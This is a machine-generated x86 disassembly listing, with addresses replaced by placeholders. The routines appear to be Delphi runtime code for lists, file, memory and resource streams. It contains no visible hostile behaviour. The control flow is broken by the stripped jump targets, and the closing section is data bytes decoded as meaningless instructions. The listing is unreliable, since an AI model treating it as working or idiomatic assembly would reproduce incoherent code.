je r-xdata
mov esi ebx
sub_4157f0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414b60
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_403ffc
pop edi
pop esi
pop ebx
retn
sub_41582c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414b60
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_415854
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_415888
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_414e28
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_4158d4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_414b60
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414b60
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_415928
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_415854
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_403ffc
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4028b8
sub_4159a0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_414b60
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414b60
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_403ffc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_4159fc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414b60
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_415a3c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_415754
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_415a3c
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_415aec
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_415b48
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_415a3c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_415b9c
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_415bd0
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_415c34
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
call sub_4039e4
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_415c88
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4031a8
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7f0
call sub_4039e4
mov esp ebp
pop ebp
retn
sub_415cd4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_4031a0
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_415c88
pop ecx
mov eax [ ebx ]
call sub_4031e4
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_415c88
pop ecx
sub_415d58
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
call sub_4039e4
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_415dc8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
call sub_4039e4
sub_415e00
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
call sub_4039e4
sub_415e38
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_415bbc
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026bc
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_415f14
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415f1b
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4026dc
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_415dc8
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_415e00
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_415f2c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4166e0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_415f7c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_418714
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415f83
mov eax [ ebp - 0x8 ]
call sub_403258
retn
sub_415f8c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403228
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_415fe8
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_408474
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_416028
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40cd90
pop ebx
pop ebp
retn 0x8
sub_416050
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_416094
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_416094
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_4161bd
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_40357c
movzx edx di
mov eax esi
call sub_408398
mov ecx eax
xor edx edx
mov eax ebx
call sub_415f8c
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_408414
mov ecx eax
xor edx edx
mov eax ebx
call sub_415f8c
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4161c4
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_403fcc
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_40862c
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40aef0
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7f0
call sub_4039e4
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_40862c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40aef0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7f0
call sub_4039e4
jmp r-xdata
sub_4161c4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_4161e8
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
call sub_4084ac
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_416224
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4028b8
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_41625c
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_416280
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax esi
call sub_4162ac
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_4162c4
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_415bbc
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_415dc8
sub_4162fc
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_41621c
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_416324
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_4162fc
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_416350
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_4069dc
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_4069c0
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_4069b0
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7b4
call sub_4039e4
test ecx ecx
jne r-xdata
sub_4163dc
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4028b8
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_4162fc
sub_41642c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403228
lea eax [ edi + 0x4 ]
mov edx esi
call sub_403ffc
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_416470
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4 ]
call sub_404268
mov esi eax
sub esi [ ebx + 0x8 ]
cmp edi esi
jge r-xdata
lea eax [ ebx + 0x4 ]
call j_sub_404474#2
mov edx [ ebx + 0x8 ]
add eax edx
mov edx ebp
mov ecx esi
call sub_4028b8
add [ ebx + 0x8 ] esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi edi
sub_4164b0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi ecx
mov edx [ ebx + 0x8 ]
add edx esi
lea eax [ ebx + 0x4 ]
call sub_4045f4
lea eax [ ebx + 0x4 ]
call j_sub_404474#2
mov edx [ ebx + 0x8 ]
lea edx [ eax + edx ]
mov eax edi
mov ecx esi
call sub_4028b8
add [ ebx + 0x8 ] esi
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_4164e8
push ebx
push esi
mov esi edx
mov ebx eax
sub cx 0x1
jb r-xdata
mov [ ebx + 0x8 ] esi
jmp r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_404268
cmp eax [ ebx + 0x8 ]
jge r-xdata
add [ ebx + 0x8 ] esi
jmp r-xdata
dec cx
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jge r-xdata
mov eax [ ebx + 0x4 ]
call sub_404268
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
call sub_404268
sub eax esi
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov eax [ ebx + 0x8 ]
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x8 ] eax
sub_416540
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x4 ]
mov edx esi
call sub_4045f4
cmp esi [ ebx + 0x8 ]
jge r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] esi
sub_41655c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403228
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_404468
mov ecx eax
mov edx esi
mov eax edi
call sub_416624
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_4165b4
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_416617
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_4039e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41661e
lea eax [ ebp - 0xc ]
call sub_403fa8
retn
sub_416624
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_4165b4
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_41621c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_4165b4
pop ecx
sub_416690
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_4069ac
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_4166e0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4026bc
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_416728
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_4026dc
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_416758
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x18004167 ] bh
add [ eax ] al
add [ eax - 0x5fffbff0 ] ah
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add ah cl
push 0xe0041
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc al 0x0
add [ eax ] al
or dl [ eax + edx * 2 + 0x72 ]
outsd
jo r-xdata
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add ah bl
push 0x540e0041
push eax
jb r-xdata
imul edi [ eax + 0x75 ] r-xdata
sbb [ eax + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebp * 2 ] bl
inc ecx
add [ eax ] bl
add [ eax ] al
add [ edi + 0x41 ] dl
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
fsubp st3
add [ ebx - 0x76 ] eax
adc eax [ edx + edx * 8 - 0x157ffa8c ]
r-xdata
jo r-xdata
inc ebx
cmp [ ebx ] 0x0
je r-xdata
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
outsb
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_404098
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_404508
mov al 0x1
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
inc esi
imul edi [ eax + 0x75 ] 0x8b559070
in al dx
push ebx
push esi
test dl dl
je r-xdata
